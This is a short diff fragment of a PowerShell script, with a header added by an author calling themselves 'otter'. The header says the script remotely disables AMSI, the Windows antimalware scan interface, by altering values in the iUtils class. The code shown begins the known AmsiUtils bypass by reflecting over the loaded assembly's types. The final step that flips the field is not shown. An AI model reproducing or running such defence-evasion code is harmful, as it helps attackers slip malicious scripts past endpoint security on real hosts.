@@ -1,3 +1,10 @@
+"""
+author: otter ʕ •ᴥ•ʔ
+
+This script can be used to remotely disable the AMSI service on a host
+by altering the values of the iUtils class.
+"""
+
 # gets all types defined in the current assembly at runtime
 $a = [Ref].Assembly.GetTypes()
 # iterates over types and checks if name contains "iUtils"
